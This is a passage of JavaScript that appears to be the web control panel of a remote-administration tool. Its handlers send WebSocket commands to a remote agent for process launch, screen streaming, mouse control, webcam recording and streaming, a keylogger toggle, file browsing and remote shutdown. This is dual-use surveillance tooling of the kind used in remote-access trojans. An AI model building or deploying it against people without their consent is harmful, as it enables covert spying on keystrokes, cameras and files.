        $('#btn-start-process').onclick = () => showModal('modal-start-process');
        $('#btn-start-app').onclick = () => showModal('modal-start-app');
        $('#modal-start-process [data-action="confirm"]').onclick = () => { sendWsMessage({ command: 'start_process', path: $('#input-proc-path').value, args: $('#input-proc-args').value }); handleCloseModal(); };
        $('#modal-start-app [data-action="confirm"]').onclick = () => { sendWsMessage({ command: 'start_application', app_name: $('#input-app-name').value }); handleCloseModal(); };

        // 5. Screen Controls
        btnTakeScreenshot.onclick = () => {
            if (!canUseAgentFeature()) return;

            sendWsMessage({ command: 'stop_screen_stream' });

            $('#capture-display-area .empty-state').classList.add('hidden');
            captureSpinner.classList.remove('hidden');

            sendWsMessage({ command: 'capture_screen' });

            btnStartStream.classList.remove('hidden');
            btnStopStream.classList.add('hidden');
        };


        btnStopStream.onclick = () => { sendWsMessage({ command: 'stop_screen_stream' }); resetScreenUI(); };
        btnSaveScreenshot.onclick = () => { const a = document.createElement('a'); a.href = captureImg.src; a.download = `screen-${Date.now()}.png`; a.click(); };
        btnCopyScreenshot.onclick = async () => { try { const response = await fetch(captureImg.src); const blob = await response.blob(); await navigator.clipboard.write([new ClipboardItem({ [blob.type]: blob })]); alert('Copied to clipboard!'); } catch (err) { alert('Copy failed'); } };

        // Mouse Control
        let lastSent = 0; const THROTTLE_MS = 50;
        function sendMouse(payload) { if (ws && ws.readyState === WebSocket.OPEN && !streamImg.classList.contains('hidden') && mouseToggle && mouseToggle.checked) { payload.command = 'mouse_input'; sendWsMessage(payload); } }
        streamImg.addEventListener('mousemove', (e) => { if (Date.now() - lastSent < THROTTLE_MS) return; lastSent = Date.now(); const rect = streamImg.getBoundingClientRect(); sendMouse({ action: 'move', x: (e.clientX - rect.left)/rect.width, y: (e.clientY - rect.top)/rect.height }); });
        streamImg.addEventListener('mousedown', (e) => { sendMouse({ action: 'click', button: e.button===2?'right':(e.button===1?'middle':'left'), state: 'down' }); });
        streamImg.addEventListener('mouseup', (e) => { sendMouse({ action: 'click', button: e.button===2?'right':(e.button===1?'middle':'left'), state: 'up' }); });
        streamImg.addEventListener('contextmenu', e => { if(mouseToggle && mouseToggle.checked) e.preventDefault(); });
        streamImg.addEventListener('wheel', (e) => { if(mouseToggle && mouseToggle.checked) { e.preventDefault(); const delta = e.deltaY > 0 ? -120 : 120; sendMouse({ action: 'scroll', delta: delta }); } }, { passive: false });

        // 6. Webcam Controls
        const emptyIcon = $('#webcam-display-area .empty-icon');
        if (emptyIcon) emptyIcon.classList.remove('hidden');
        webcamPlaceholder.textContent = "Ready to record or stream webcam";
        webcamPlaceholder.parentElement.classList.remove('hidden');
        btnStartWebcamStream.classList.remove('hidden');
        btnStopWebcamStream.classList.add('hidden');
        btnStartRecord.classList.remove('hidden');

        btnStartRecord.onclick = () => { webcamMode = 'record'; sendWsMessage({ command: 'stop_webcam_stream' }); clearWebcamStreamUI(); showModal('modal-webcam-device'); };
        $('#modal-webcam-device [data-action="confirm"]').onclick = () => { webcamMode = 'record'; sendWsMessage({ command: 'start_webcam_record', time: parseInt(inputWebcamDuration.value) || 10, device_name: inputWebcamDeviceName.value }); handleCloseModal(); };
        btnStopRecord.onclick = () => sendWsMessage({ command: 'stop_webcam_record' });

        btnStartWebcamStream.onclick = () => { webcamMode = 'stream'; sendWsMessage({ command: 'start_webcam_stream', fps: 30 }); btnStartWebcamStream.classList.add('hidden'); btnStopWebcamStream.classList.remove('hidden'); };
        btnStopWebcamStream.onclick = () => { webcamMode = 'idle'; sendWsMessage({ command: 'stop_webcam_stream' }); clearWebcamStreamUI(); btnStartWebcamStream.classList.remove('hidden'); btnStopWebcamStream.classList.add('hidden'); };
        if(btnReloadWebcam) btnReloadWebcam.onclick = () => { webcamMode = 'idle'; sendWsMessage({ command: 'stop_webcam_stream' }); clearWebcamStreamUI(); btnStartWebcamStream.classList.remove('hidden'); btnStopWebcamStream.classList.add('hidden'); btnSaveVideo.classList.add('hidden'); };
        btnSaveVideo.onclick = () => { if (currentVideoBlob) { const a = document.createElement('a'); a.href = URL.createObjectURL(currentVideoBlob); a.download = `webcam-${Date.now()}.mp4`; a.click(); } };

        // 7. Keylogger
        keylogToggle.onchange = e => {
            if (!ws || ws.readyState !== WebSocket.OPEN || !currentAgentId) {
                e.target.checked = false;
                return;
            }

            sendWsMessage({
                command: e.target.checked ? 'start_keylog' : 'stop_keylog'
            });

            keylogOutput.textContent = e.target.checked
                ? 'Starting...'
                : 'Stopped.';

            isKeylogClean = true;
        };

        if (btnClearKeylog) btnClearKeylog.onclick = () => { keylogOutput.textContent = 'Cleared.'; isKeylogClean = true; };

        // 8. File Manager Events
        if (btnFsGo) btnFsGo.onclick = () => { const path = inputFsPath.value; if (path) sendWsMessage({ command: 'fs_list', path: path, context: 'view' }); };
        if (inputFsPath) inputFsPath.addEventListener("keypress", (event) => { if (event.key === "Enter") btnFsGo.click(); });
        if (btnFsUp) btnFsUp.onclick = () => {
            let p = currentPath;
            if (p.endsWith('\\') || p.endsWith('/')) p = p.slice(0, -1);
            const lastSlash = Math.max(p.lastIndexOf('\\'), p.lastIndexOf('/'));
            if (lastSlash === -1) { sendWsMessage({ command: 'fs_drives' }); return; }
            let parent = p.substring(0, lastSlash);
            if (parent.length === 2 && parent.charAt(1) === ':') parent += "\\";
            if (parent === "") sendWsMessage({ command: 'fs_drives' }); else sendWsMessage({ command: 'fs_list', path: parent, context: 'view' });
        };
        if (btnFsRefresh) btnFsRefresh.onclick = () => { if (ws && ws.readyState === WebSocket.OPEN) { sendWsMessage({ command: 'fs_drives' }); sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' }); } };
        if (btnNewFolder) btnNewFolder.onclick = () => { const name = prompt("Enter new folder name:"); if (name) sendWsMessage({ command: 'fs_mkdir', path: currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name }); };
        if (btnNewFile) btnNewFile.onclick = () => { const name = prompt("Enter new file name (e.g., text.txt):"); if (name) { sendWsMessage({ command: 'fs_mkfile', path: currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name }); setTimeout(() => sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' }), 500); } };

        // 9. System Actions
        if ($('#btn-system-restart')) {
            $('#btn-system-restart').onclick = () => {
                if (!canUseAgentFeature()) return; // ⛔ chặn thật

                showConfirmModal(
                    'Restart',
                    'Restart remote PC?',
                    'danger',
                    () => sendWsMessage({ command: 'system_restart' })
                );
            };
        }

        if ($('#btn-system-shutdown')) {
            $('#btn-system-shutdown').onclick = () => {
                if (!canUseAgentFeature()) return; // ⛔ chặn thật

                showConfirmModal(
                    'Shutdown',
                    'Shutdown remote PC?',
                    'danger',
                    () => sendWsMessage({ command: 'system_shutdown' })
                );
            };
        }

        // 10. Theme & Traffic Lights
        $('.dot.red').onclick = () => { if (ws) disconnectWs(); };
        $('.dot.yellow').onclick = () => { if (themeToggle) themeToggle.click(); };
        $('.dot.green').onclick = () => document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();

        if (themeToggle) {
            themeToggle.onchange = e => { document.body.className = e.target.checked ? 'dark-theme' : ''; localStorage.setItem('theme', e.target.checked ? 'dark' : 'light'); };
            const saved = localStorage.getItem('theme');
            if (saved === 'dark') { document.body.classList.add('dark-theme'); themeToggle.checked = true; } 
            else { document.body.classList.remove('dark-theme'); themeToggle.checked = false; }
        }
    }

    // =================================================================
    // START
    // =================================================================
    init();
    setTimeout(() => { if (typeof feather !== 'undefined') feather.replace(); }, 500);
});